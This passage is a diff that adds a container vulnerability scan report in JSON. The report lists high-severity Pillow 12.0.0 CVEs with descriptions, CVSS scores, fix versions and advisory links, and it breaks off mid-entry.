+            "Digest": "sha256:0ada8e1de6c1a9d34f8034709d2eda19734a242b1470ff34ad23e79cd2bd74b1",
+            "DiffID": "sha256:d5e66515b46453d94b906716c47e4ee5e98dd52ba2b89517edb39038db6e529e"
+          },
+          "SeveritySource": "ghsa",
+          "PrimaryURL": "https://avd.aquasec.com/nvd/cve-2026-54059",
+          "DataSource": {
+            "ID": "ghsa",
+            "Name": "GitHub Security Advisory pip",
+            "URL": "https://github.com/advisories?query=type%3Areviewed+ecosystem%3Apip"
+          },
+          "Fingerprint": "sha256:f6350b10645e21bedefb048da4d92a16fa8ab192cf483ba81c67d427f1840dcd",
+          "Title": "python-pillow: Pillow: Denial of Service via crafted PCF font data",
+          "Description": "Pillow is a Python imaging library. Prior to 12.3.0, PIL/PcfFontFile.py _load_bitmaps() read glyph dimensions from the PCF METRICS section and passed them directly to Image.frombytes() without calling Image._decompression_bomb_check(), allowing crafted PCF font data to cause excessive memory allocation. This issue is fixed in version 12.3.0.",
+          "Severity": "HIGH",
+          "CweIDs": [
+            "CWE-789"
+          ],
+          "VendorSeverity": {
+            "alma": 3,
+            "amazon": 3,
+            "bitnami": 3,
+            "ghsa": 3,
+            "oracle-oval": 3,
+            "redhat": 3,
+            "rocky": 3
+          },
+          "CVSS": {
+            "bitnami": {
+              "V3Vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H",
+              "V3Score": 7.5
+            },
+            "ghsa": {
+              "V3Vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H",
+              "V3Score": 7.5
+            },
+            "redhat": {
+              "V3Vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H",
+              "V3Score": 7.5
+            }
+          },
+          "References": [
+            "https://access.redhat.com/errata/RHSA-2026:39127",
+            "https://access.redhat.com/security/cve/CVE-2026-54059",
+            "https://bugzilla.redhat.com/2497452",
+            "https://bugzilla.redhat.com/2497455",
+            "https://bugzilla.redhat.com/2497464",
+            "https://bugzilla.redhat.com/2497466",
+            "https://bugzilla.redhat.com/show_bug.cgi?id=2497452",
+            "https://bugzilla.redhat.com/show_bug.cgi?id=2497455",
+            "https://bugzilla.redhat.com/show_bug.cgi?id=2497464",
+            "https://bugzilla.redhat.com/show_bug.cgi?id=2497466",
+            "https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2026-54059",
+            "https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2026-54060",
+            "https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2026-55379",
+            "https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2026-55380",
+            "https://errata.almalinux.org/8/ALSA-2026-39127.html",
+            "https://errata.rockylinux.org/RLSA-2026:39127",
+            "https://github.com/pypa/advisory-database/tree/main/vulns/pillow/PYSEC-2026-2253.yaml",
+            "https://github.com/python-pillow/Pillow",
+            "https://github.com/python-pillow/Pillow/blob/main/docs/releasenotes/12.3.0.rst",
+            "https://github.com/python-pillow/Pillow/commit/0a263e6264aa5399988d9acd3bbfbca2ca3ec77d",
+            "https://github.com/python-pillow/Pillow/security/advisories/GHSA-8v84-f9pq-wr9x",
+            "https://linux.oracle.com/cve/CVE-2026-54059.html",
+            "https://linux.oracle.com/errata/ELSA-2026-39127.html",
+            "https://nvd.nist.gov/vuln/detail/CVE-2026-54059",
+            "https://www.cve.org/CVERecord?id=CVE-2026-54059"
+          ],
+          "PublishedDate": "2026-07-06T19:17:08.127Z",
+          "LastModifiedDate": "2026-07-07T18:58:26.73Z"
+        },
+        {
+          "VulnerabilityID": "CVE-2026-54060",
+          "VendorIDs": [
+            "GHSA-5x94-69rx-g8h2"
+          ],
+          "PkgName": "pillow",
+          "PkgPath": "usr/local/lib/python3.10/site-packages/pillow-12.0.0.dist-info/METADATA",
+          "PkgIdentifier": {
+            "PURL": "pkg:pypi/pillow@12.0.0",
+            "UID": "67b1b4628d170ead"
+          },
+          "InstalledVersion": "12.0.0",
+          "FixedVersion": "12.3.0",
+          "Status": "fixed",
+          "Layer": {
+            "Digest": "sha256:0ada8e1de6c1a9d34f8034709d2eda19734a242b1470ff34ad23e79cd2bd74b1",
+            "DiffID": "sha256:d5e66515b46453d94b906716c47e4ee5e98dd52ba2b89517edb39038db6e529e"
+          },
+          "SeveritySource": "ghsa",
+          "PrimaryURL": "https://avd.aquasec.com/nvd/cve-2026-54060",
+          "DataSource": {
+            "ID": "ghsa",
+            "Name": "GitHub Security Advisory pip",
+            "URL": "https://github.com/advisories?query=type%3Areviewed+ecosystem%3Apip"
+          },
+          "Fingerprint": "sha256:2a93f5ad1785f047ee3d08a355320c1022495950a3c7d852dab912fcab84f8e1",
+          "Title": "python-pillow: Pillow: Denial of Service via excessive memory allocation when processing font files",
+          "Description": "Pillow is a Python imaging library. Prior to 12.3.0, PIL/FontFile.py FontFile.compile() assembled per-glyph images into a combined bitmap with Image.new(\"1\", (xsize, ysize)) without calling Image._decompression_bomb_check(), allowing a font to trigger excessive allocation during conversion or saving. This issue is fixed in version 12.3.0.",
+          "Severity": "HIGH",
+          "CweIDs": [
+            "CWE-789"
+          ],
+          "VendorSeverity": {
+            "alma": 3,
+            "amazon": 3,
+            "bitnami": 3,
+            "ghsa": 3,
+            "oracle-oval": 3,
+            "redhat": 3,
+            "rocky": 3
+          },
+          "CVSS": {
+            "bitnami": {
+              "V3Vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H",
+              "V3Score": 7.5
+            },
+            "ghsa": {
+              "V3Vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H",
+              "V3Score": 7.5
+            },
+            "redhat": {
+              "V3Vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H",
+              "V3Score": 7.5
+            }
+          },
+          "References": [
+            "https://access.redhat.com/errata/RHSA-2026:39127",
+            "https://access.redhat.com/security/cve/CVE-2026-54060",
+            "https://bugzilla.redhat.com/2497452",
+            "https://bugzilla.redhat.com/2497455",
+            "https://bugzilla.redhat.com/2497464",
+            "https://bugzilla.redhat.com/2497466",
+            "https://bugzilla.redhat.com/show_bug.cgi?id=2497452",
+            "https://bugzilla.redhat.com/show_bug.cgi?id=2497455",
+            "https://bugzilla.redhat.com/show_bug.cgi?id=2497464",
+            "https://bugzilla.redhat.com/show_bug.cgi?id=2497466",
+            "https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2026-54059",
+            "https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2026-54060",
+            "https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2026-55379",
+            "https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2026-55380",
+            "https://errata.almalinux.org/8/ALSA-2026-39127.html",
+            "https://errata.rockylinux.org/RLSA-2026:39127",
+            "https://github.com/pypa/advisory-database/tree/main/vulns/pillow/PYSEC-2026-2254.yaml",
+            "https://github.com/python-pillow/Pillow",
+            "https://github.com/python-pillow/Pillow/blob/main/docs/releasenotes/12.3.0.rst",
+            "https://github.com/python-pillow/Pillow/commit/0a263e6264aa5399988d9acd3bbfbca2ca3ec77d",
+            "https://github.com/python-pillow/Pillow/security/advisories/GHSA-5x94-69rx-g8h2",
+            "https://linux.oracle.com/cve/CVE-2026-54060.html",
+            "https://linux.oracle.com/errata/ELSA-2026-39127.html",
+            "https://nvd.nist.gov/vuln/detail/CVE-2026-54060",
+            "https://www.cve.org/CVERecord?id=CVE-2026-54060"
+          ],
+          "PublishedDate": "2026-07-06T19:17:08.27Z",
+          "LastModifiedDate": "2026-07-07T18:58:45.827Z"
+        },
+        {
+          "VulnerabilityID": "CVE-2026-55379",
+          "VendorIDs": [
+            "GHSA-45hq-cxwh-f6vc"
+          ],
+          "PkgName": "pillow",
+          "PkgPath": "usr/local/lib/python3.10/site-packages/pillow-12.0.0.dist-info/METADATA",
+          "PkgIdentifier": {
+            "PURL": "pkg:pypi/pillow@12.0.0",
+            "UID": "67b1b4628d170ead"
+          },
+          "InstalledVersion": "12.0.0",
+          "FixedVersion": "12.3.0",
+          "Status": "fixed",
+          "Layer": {
+            "Digest": "sha256:0ada8e1de6c1a9d34f8034709d2eda19734a242b1470ff34ad23e79cd2bd74b1",
+            "DiffID": "sha256:d5e66515b46453d94b906716c47e4ee5e98dd52ba2b89517edb39038db6e529e"
+          },
+          "SeveritySource": "ghsa",
+          "PrimaryURL": "https://avd.aquasec.com/nvd/cve-2026-55379",
+          "DataSource": {
+            "ID": "ghsa",
+            "Name": "GitHub Security Advisory pip",
+            "URL": "https://github.com/advisories?query=type%3Areviewed+ecosystem%3Apip"
+          },
+          "Fingerprint": "sha256:d071ab2426e7193d094233d3c8daa9ebf99d5bee584e4303b8e2105cdd404dbc",
+          "Title": "python-pillow: Pillow: Denial of Service via crafted BDF font file",
+          "Description": "Pillow is a Python imaging library. Prior to 12.3.0, PIL/BdfFontFile.py bdf_char() read the BBX width and height field from a BDF font file and passed attacker-controlled dimensions to Image.new() without calling Image._decompression_bomb_check(), bypassing Pillow's documented decompression bomb protection and allowing excessive memory allocation. This issue is fixed in version 12.3.0.",
+          "Severity": "HIGH",
+          "CweIDs": [
+            "CWE-789"
+          ],
+          "VendorSeverity": {
+            "alma": 3,
+            "amazon": 3,
+            "bitnami": 3,
+            "ghsa": 3,
+            "oracle-oval": 3,
+            "redhat": 3,
+            "rocky": 3
+          },
+          "CVSS": {
+            "bitnami": {
+              "V3Vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H",
+              "V3Score": 7.5
+            },
+            "ghsa": {
+              "V3Vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H",
+              "V3Score": 7.5
+            },
+            "redhat": {
+              "V3Vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H",
+              "V3Score": 7.5
+            }
+          },
+          "References": [
+            "https://access.redhat.com/errata/RHSA-2026:39127",
+            "https://access.redhat.com/security/cve/CVE-2026-55379",
+            "https://bugzilla.redhat.com/2497452",
+            "https://bugzilla.redhat.com/2497455",
+            "https://bugzilla.redhat.com/2497464",
+            "https://bugzilla.redhat.com/2497466",
+            "https://bugzilla.redhat.com/show_bug.cgi?id=2497452",
+            "https://bugzilla.redhat.com/show_bug.cgi?id=2497455",
+            "https://bugzilla.redhat.com/show_bug.cgi?id=2497464",
+            "https://bugzilla.redhat.com/show_bug.cgi?id=2497466",
+            "https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2026-54059",
+            "https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2026-54060",
+            "https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2026-55379",
+            "https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2026-55380",
+            "https://errata.almalinux.org/8/ALSA-2026-39127.html",
+            "https://errata.rockylinux.org/RLSA-2026:39127",
+            "https://github.com/pypa/advisory-database/tree/main/vulns/pillow/PYSEC-2026-2255.yaml",
+            "https://github.com/python-pillow/Pillow",
+            "https://github.com/python-pillow/Pillow/blob/main/docs/releasenotes/12.3.0.rst",
+            "https://github.com/python-pillow/Pillow/commit/0a263e6264aa5399988d9acd3bbfbca2ca3ec77d",
+            "https://github.com/python-pillow/Pillow/security/advisories/GHSA-45hq-cxwh-f6vc",
+            "https://linux.oracle.com/cve/CVE-2026-55379.html",
+            "https://linux.oracle.com/errata/ELSA-2026-39127.html",
+            "https://nvd.nist.gov/vuln/detail/CVE-2026-55379",
+            "https://www.cve.org/CVERecord?id=CVE-2026-55379"
+          ],
+          "PublishedDate": "2026-07-06T19:17:08.577Z",
+          "LastModifiedDate": "2026-07-07T18:59:01.817Z"
+        },
+        {
+          "VulnerabilityID": "CVE-2026-55380",
+          "VendorIDs": [
+            "GHSA-phj9-mv4w-65pm"
+          ],
+          "PkgName": "pillow",
+          "PkgPath": "usr/local/lib/python3.10/site-packages/pillow-12.0.0.dist-info/METADATA",
+          "PkgIdentifier": {
+            "PURL": "pkg:pypi/pillow@12.0.0",
+            "UID": "67b1b4628d170ead"
+          },
+          "InstalledVersion": "12.0.0",
+          "FixedVersion": "12.3.0",
+          "Status": "fixed",
+          "Layer": {
+            "Digest": "sha256:0ada8e1de6c1a9d34f8034709d2eda19734a242b1470ff34ad23e79cd2bd74b1",
+            "DiffID": "sha256:d5e66515b46453d94b906716c47e4ee5e98dd52ba2b89517edb39038db6e529e"
+          },
+          "SeveritySource": "ghsa",
+          "PrimaryURL": "https://avd.aquasec.com/nvd/cve-2026-55380",
+          "DataSource": {
+            "ID": "ghsa",
+            "Name": "GitHub Security Advisory pip",
+            "URL": "https://github.com/advisories?query=type%3Areviewed+ecosystem%3Apip"
+          },
+          "Fingerprint": "sha256:a1ccdc5410926383b3e4d1f4eb87b07f639fb1e43c18df8aba0901dc969c7d76",
+          "Title": "python-pillow: Pillow: Denial of Service via crafted GD 2.x image file",
+          "Description": "Pillow is a Python imaging library. Prior to 12.3.0, PIL/GdImageFile.py GdImageFile._open() read image dimensions from the GD 2.x header and stored them in self._size without calling Image._decompression_bomb_check(), allowing a crafted .gd file to trigger excessive C-heap allocation when loaded. This issue is fixed in version 12.3.0.",
+          "Severity": "HIGH",
+          "CweIDs": [
+            "CWE-789"
+          ],
+          "VendorSeverity": {
+            "alma": 3,
+            "amazon": 3,
+            "bitnami": 3,
+            "ghsa": 3,
+            "oracle-oval": 3,
+            "redhat": 3,
+            "rocky": 3
+          },
+          "CVSS": {
+            "bitnami": {
+              "V3Vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H",
+              "V3Score": 7.5
+            },
+            "ghsa": {
+              "V3Vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H",
+              "V3Score": 7.5
+            },
+            "redhat": {
+              "V3Vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H",
+              "V3Score": 7.5
+            }
+          },
+          "References": [
+            "https://access.redhat.com/errata/RHSA-2026:39127",
+            "https://access.redhat.com/security/cve/CVE-2026-55380",
+            "https://bugzilla.redhat.com/2497452",
+            "https://bugzilla.redhat.com/2497455",
+            "https://bugzilla.redhat.com/2497464",
+            "https://bugzilla.redhat.com/2497466",
+            "https://bugzilla.redhat.com/show_bug.cgi?id=2497452",
+            "https://bugzilla.redhat.com/show_bug.cgi?id=2497455",
+            "https://bugzilla.redhat.com/show_bug.cgi?id=2497464",
+            "https://bugzilla.redhat.com/show_bug.cgi?id=2497466",
+            "https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2026-54059",
+            "https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2026-54060",
+            "https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2026-55379",
+            "https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2026-55380",
+            "https://errata.almalinux.org/8/ALSA-2026-39127.html",
+            "https://errata.rockylinux.org/RLSA-2026:39127",
+            "https://github.com/pypa/advisory-database/tree/main/vulns/pillow/PYSEC-2026-2256.yaml",
+            "https://github.com/python-pillow/Pillow",
+            "https://github.com/python-pillow/Pillow/blob/main/docs/releasenotes/12.3.0.rst",
+            "https://github.com/python-pillow/Pillow/commit/f39b0ae6624eb2d7c5c5d651d9bb5fdbd96a8675",
+            "https://github.com/python-pillow/Pillow/security/advisories/GHSA-phj9-mv4w-65pm",
+            "https://linux.oracle.com/cve/CVE-2026-55380.html",
+            "https://linux.oracle.com/errata/ELSA-2026-39127.html",
+            "https://nvd.nist.gov/vuln/detail/CVE-2026-55380",
+            "https://www.cve.org/CVERecord?id=CVE-2026-55380"
+          ],
+          "PublishedDate": "2026-07-06T19:17:08.703Z",
+          "LastModifiedDate": "2026-07-07T18:58:54.647Z"
+        },
+        {
+          "VulnerabilityID": "CVE-2026-59197",
+          "VendorIDs": [
+            "GHSA-xj96-63gp-2gmr"
+          ],
+          "PkgName": "pillow",
+          "PkgPath": "usr/local/lib/python3.10/site-packages/pillow-12.0.0.dist-info/METADATA",
+          "PkgIdentifier": {
+            "PURL": "pkg:pypi/pillow@12.0.0",
+            "UID": "67b1b4628d170ead"
+          },
+          "InstalledVersion": "12.0.0",
+          "FixedVersion": "12.3.0",
+          "Status": "fixed",
+          "Layer": {
+            "Digest": "sha256:0ada8e1de6c1a9d34f8034709d2eda19734a242b1470ff34ad23e79cd2bd74b1",
+            "DiffID": "sha256:d5e66515b46453d94b906716c47e4ee5e98dd52ba2b89517edb39038db6e529e"
+          },
+          "SeveritySource": "ghsa",
+          "PrimaryURL": "https://avd.aquasec.com/nvd/cve-2026-59197",
+          "DataSource": {
+            "ID": "ghsa",
+            "Name": "GitHub Security Advisory pip",
+            "URL": "https://github.com/advisories?query=type%3Areviewed+ecosystem%3Apip"
+          },
+          "Fingerprint": "sha256:14baa4a4b48f4feafd3060261b963c2e0a6ae5b61f91d2281dceeb0022e49120",
+          "Title": "Pillow: Pillow: Native heap out-of-bounds write",
+          "Description": "Pillow is a Python imaging library. Prior to 12.3.0, Pillow's public rank-filter API can trigger a native heap out-of-bounds write when given a very large odd filter size because ImageFilter.RankFilter.filter() calls image.expand(size // 2, size // 2) before rank-filter size validation and ImagingExpand() computes output dimensions with unchecked signed int arithmetic. This issue is fixed in version 12.3.0.",
+          "Severity": "HIGH",
+          "CweIDs": [
+            "CWE-190",
+            "CWE-787"
+          ],
+          "VendorSeverity": {
+            "bitnami": 3,
+            "ghsa": 3,
+            "oracle-oval": 3,
+            "redhat": 3
+          },
+          "CVSS": {
+            "bitnami": {
+              "V3Vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:L/A:H",
+              "V3Score": 8.2
+            },
+            "ghsa": {
+              "V3Vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:L/A:H",
+              "V3Score": 8.2
+            },
+            "redhat": {
+              "V3Vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:L/A:H",
+              "V3Score": 8.2
+            }
+          },
+          "References": [
+            "https://access.redhat.com/security/cve/CVE-2026-59197",
+            "https://github.com/python-pillow/Pillow",
+            "https://github.com/python-pillow/Pillow/commit/cce3bdb867c77a3420261ed1bfdb6b0787ec8fc1",
+            "https://github.com/python-pillow/Pillow/pull/9695",
+            "https://github.com/python-pillow/Pillow/releases/tag/12.3.0",
+            "https://github.com/python-pillow/Pillow/security/advisories/GHSA-xj96-63gp-2gmr",
+            "https://linux.oracle.com/cve/CVE-2026-59197.html",
+            "https://linux.oracle.com/errata/ELSA-2026-48021.html",
+            "https://nvd.nist.gov/vuln/detail/CVE-2026-59197",
+            "https://www.cve.org/CVERecord?id=CVE-2026-59197"
+          ],
+          "PublishedDate": "2026-07-14T17:17:14.487Z",
+          "LastModifiedDate": "2026-07-21T19:17:11.907Z"
+        },
+        {
+          "VulnerabilityID": "CVE-2026-59199",
+          "VendorIDs": [
+            "GHSA-6r8x-57c9-28j4"
+          ],
+          "PkgName": "pillow",
+          "PkgPath": "usr/local/lib/python3.10/site-packages/pillow-12.0.0.dist-info/METADATA",
+          "PkgIdentifier": {
+            "PURL": "pkg:pypi/pillow@12.0.0",
+            "UID": "67b1b4628d170ead"
+          },
+          "InstalledVersion": "12.0.0",
+          "FixedVersion": "12.3.0",
+          "Status": "fixed",
+          "Layer": {
+            "Digest": "sha256:0ada8e1de6c1a9d34f8034709d2eda19734a242b1470ff34ad23e79cd2bd74b1",
+            "DiffID": "sha256:d5e66515b46453d94b906716c47e4ee5e98dd52ba2b89517edb39038db6e529e"
+          },
+          "SeveritySource": "ghsa",
+          "PrimaryURL": "https://avd.aquasec.com/nvd/cve-2026-59199",
+          "DataSource": {
+            "ID": "ghsa",
+            "Name": "GitHub Security Advisory pip",
+            "URL": "https://github.com/advisories?query=type%3Areviewed+ecosystem%3Apip"
+          },
+          "Fingerprint": "sha256:e40d0f6a801ddd624dbb27e27e4167db1d105ec4a28a8e552f6c095c69593952",
+          "Title": "Pillow: Pillow: Denial of Service via out-of-bounds write in image processing",
+          "Description": "Pillow is a Python imaging library. Prior to 12.3.0, Pillow public image coordinate APIs can trigger a native heap out-of-bounds write when given coordinates near the signed 32-bit integer limits in Image.paste(), Image.crop(), or Image.alpha_composite(). This issue is fixed in version 12.3.0.",
+          "Severity": "HIGH",
+          "CweIDs": [
+            "CWE-190",
+            "CWE-787"
+          ],
+          "VendorSeverity": {
+            "bitnami": 3,
+            "ghsa": 3,
+            "redhat": 3
+          },
+          "CVSS": {
+            "bitnami": {
+              "V3Vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H",
+              "V3Score": 7.5
+            },
+            "ghsa": {
+              "V3Vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H",
+              "V3Score": 7.5
+            },
+            "redhat": {
+              "V3Vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H",
+              "V3Score": 7.5
+            }
+          },
+          "References": [
+            "https://access.redhat.com/security/cve/CVE-2026-59199",
+            "https://github.com/pypa/advisory-database/tree/main/vulns/pillow/PYSEC-2026-3451.yaml",
+            "https://github.com/python-pillow/Pillow",
+            "https://github.com/python-pillow/Pillow/commit/ceefc348eb3c3844c7f9796ef2cc3a7dd5fbba7b",
+            "https://github.com/python-pillow/Pillow/pull/9703",
+            "https://github.com/python-pillow/Pillow/releases/tag/12.3.0",
+            "https://github.com/python-pillow/Pillow/security/advisories/GHSA-6r8x-57c9-28j4",
+            "https://nvd.nist.gov/vuln/detail/CVE-2026-59199",
+            "https://www.cve.org/CVERecord?id=CVE-2026-59199"
+          ],
+          "PublishedDate": "2026-07-14T16:17:01.937Z",
+          "LastModifiedDate": "2026-07-15T16:16:49.487Z"
+        },
+        {
+          "VulnerabilityID": "CVE-2026-59200",
+          "VendorIDs": [
+            "GHSA-jjj6-mw9f-p565"
+          ],
+          "PkgName": "pillow",
+          "PkgPath": "usr/local/lib/python3.10/site-packages/pillow-12.0.0.dist-info/METADATA",
+          "PkgIdentifier": {
+            "PURL": "pkg:pypi/pillow@12.0.0",
+            "UID": "67b1b4628d170ead"
+          },
+          "InstalledVersion": "12.0.0",
+          "FixedVersion": "12.3.0",
+          "Status": "fixed",
+          "Layer": {
+            "Digest": "sha256:0ada8e1de6c1a9d34f8034709d2eda19734a242b1470ff34ad23e79cd2bd74b1",
+            "DiffID": "sha256:d5e66515b46453d94b906716c47e4ee5e98dd52ba2b89517edb39038db6e529e"
+          },
+          "SeveritySource": "ghsa",
+          "PrimaryURL": "https://avd.aquasec.com/nvd/cve-2026-59200",
+          "DataSource": {
+            "ID": "ghsa",
+            "Name": "GitHub Security Advisory pip",
+            "URL": "https://github.com/advisories?query=type%3Areviewed+ecosystem%3Apip"
+          },
+          "Fingerprint": "sha256:49fb4609232092e7eeee021c779b908142b40b70fb8bfca41e68f1d623168ef4",
+          "Title": "Pillow: Pillow: Denial of service via crafted PDF stream",
+          "Description": "Pillow is a Python imaging library. From 5.1.0 until 12.3.0, PdfParser.PdfStream.decode() in PIL/PdfParser.py calls zlib.decompress() with bufsize set to the PDF stream Length field without bounding the decompressed output size, allowing a crafted FlateDecode PDF stream to exhaust memory from a small file. This issue is fixed in version 12.3.0.",
+          "Severity": "HIGH",
+          "CweIDs": [
+            "CWE-400",
+            "CWE-770"
+          ],
+          "VendorSeverity": {
+            "bitnami": 3,
+            "ghsa": 3,
+            "redhat": 3
+          },
+          "CVSS": {
+            "bitnami": {
+              "V3Vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H",
+              "V3Score": 7.5
+            },
+            "ghsa": {
+              "V3Vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H",
+              "V3Score": 7.5
+            },
+            "redhat": {
+              "V3Vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H",
+              "V3Score": 7.5
+            }
+          },
+          "References": [
+            "https://access.redhat.com/security/cve/CVE-2026-59200",
+            "https://github.com/python-pillow/Pillow",
+            "https://github.com/python-pillow/Pillow/commit/f7a31ea75e460e108c37126da1f47812f21f6b09",
+            "https://github.com/python-pillow/Pillow/pull/9718",
+            "https://github.com/python-pillow/Pillow/releases/tag/12.3.0",
+            "https://github.com/python-pillow/Pillow/security/advisories/GHSA-jjj6-mw9f-p565",
+            "https://nvd.nist.gov/vuln/detail/CVE-2026-59200",
+            "https://www.cve.org/CVERecord?id=CVE-2026-59200"
+          ],
+          "PublishedDate": "2026-07-14T17:17:14.62Z",
+          "LastModifiedDate": "2026-07-21T15:52:40.107Z"
+        },
+        {
+          "VulnerabilityID": "CVE-2026-59204",
+          "VendorIDs": [
+            "GHSA-vjc4-5qp5-m44j"
+          ],
+          "PkgName": "pillow",
+          "PkgPath": "usr/local/lib/python3.10/site-packages/pillow-12.0.0.dist-info/METADATA",
+          "PkgIdentifier": {
+            "PURL": "pkg:pypi/pillow@12.0.0",
+            "UID": "67b1b4628d170ead"
+          },
+          "InstalledVersion": "12.0.0",
+          "FixedVersion": "12.3.0",
+          "Status": "fixed",
+          "Layer": {
+            "Digest": "sha256:0ada8e1de6c1a9d34f8034709d2eda19734a242b1470ff34ad23e79cd2bd74b1",
+            "DiffID": "sha256:d5e66515b46453d94b906716c47e4ee5e98dd52ba2b89517edb39038db6e529e"
+          },
+          "SeveritySource": "ghsa",
+          "PrimaryURL": "https://avd.aquasec.com/nvd/cve-2026-59204",
+          "DataSource": {
+            "ID": "ghsa",
+            "Name": "GitHub Security Advisory pip",
+            "URL": "https://github.com/advisories?query=type%3Areviewed+ecosystem%3Apip"
+          },
+          "Fingerprint": "sha256:4efee02a0cd0221345d1ad5999926b966a3387cd779d06298e3c0e8d9cd14bfd",
+          "Title": "Pillow: Pillow: Denial of Service via crafted JPEG2000 image",
+          "Description": "Pillow is a Python imaging library. From 8.2.0 through 12.2.0, src/libImaging/Jpeg2KDecode.c accumulates total_component_width across every tile in a JPEG2000 image instead of recomputing it per tile, allowing a crafted tiled JPEG2000 file to force substantially higher transient memory usage and trigger out-of-memory failures during decoding. This issue is fixed in version 12.3.0.",
+          "Severity": "HIGH",
+          "CweIDs": [
+            "CWE-789",
+            "CWE-770"
+          ],
+          "VendorSeverity": {
+            "bitnami": 3,
+            "ghsa": 3,
+            "nvd": 3,
+            "redhat": 3
+          },
+          "CVSS": {
+            "bitnami": {
+              "V40Vector": "CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:N/VI:N/VA:H/SC:N/SI:N/SA:N",
+              "V40Score": 8.7
+            },
+            "ghsa": {
+              "V40Vector": "CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:N/VI:N/VA:H/SC:N/SI:N/SA:N",
+              "V40Score": 8.7
+            },
+            "nvd": {
+              "V3Vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H",
+              "V3Score": 7.5
+            },
+            "redhat": {
+              "V3Vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H",
+              "V3Score": 7.5
+            }
+          },
+          "References": [
+            "https://access.redhat.com/security/cve/CVE-2026-59204",
+            "https://github.com/python-pillow/Pillow",
+            "https://github.com/python-pillow/Pillow/commit/13ada41172142f2fd9f0906f615a00ea623a11ca",
+            "https://github.com/python-pillow/Pillow/pull/9704",
+            "https://github.com/python-pillow/Pillow/releases/tag/12.3.0",
+            "https://github.com/python-pillow/Pillow/security/advisories/GHSA-vjc4-5qp5-m44j",
+            "https://nvd.nist.gov/vuln/detail/CVE-2026-59204",
+            "https://www.cve.org/CVERecord?id=CVE-2026-59204"
+          ],
+          "PublishedDate": "2026-07-14T16:17:02.227Z",
+          "LastModifiedDate": "2026-07-21T19:17:12.02Z"
+        },
+        {
+          "VulnerabilityID": "CVE-2026-59205",
+          "VendorIDs": [
+            "GHSA-9hw9-ch79-4vh6"
+          ],
+          "PkgName": "pillow",
+          "PkgPath": "usr/local/lib/python3.10/site-packages/pillow-12.0.0.dist-info/METADATA",
+          "PkgIdentifier": {
+            "PURL": "pkg:pypi/pillow@12.0.0",
+            "UID": "67b1b4628d170ead"
+          },
+          "InstalledVersion": "12.0.0",
+          "FixedVersion": "12.3.0",
+          "Status": "fixed",
+          "Layer": {
+            "Digest": "sha256:0ada8e1de6c1a9d34f8034709d2eda19734a242b1470ff34ad23e79cd2bd74b1",
+            "DiffID": "sha256:d5e66515b46453d94b906716c47e4ee5e98dd52ba2b89517edb39038db6e529e"
+          },
+          "SeveritySource": "ghsa",
+          "PrimaryURL": "https://avd.aquasec.com/nvd/cve-2026-59205",
+          "DataSource": {
+            "ID": "ghsa",
+            "Name": "GitHub Security Advisory pip",
+            "URL": "https://github.com/advisories?query=type%3Areviewed+ecosystem%3Apip"
+          },
+          "Fingerprint": "sha256:f000ab94027183c1365247d8a9a78edaf069f7b285849ebec0062ee27ee2ff04",
+          "Title": "Pillow: Pillow: Controlled native heap corruption in ImageCms.ImageCmsTransform.apply API",
+          "Description": "Pillow is a Python imaging library. Prior to 12.3.0, Pillow's ImageCms.ImageCmsTransform.apply(im, imOut) API can trigger controlled native heap corruption when the caller supplies an output image whose mode does not match the transform's declared output mode. This issue is fixed in version 12.3.0.",
+          "Severity": "HIGH",
+          "CweIDs": [
+            "CWE-787"
+          ],
+          "VendorSeverity": {
+            "bitnami": 3,
+            "ghsa": 3,
+            "redhat": 3
+          },
+          "CVSS": {
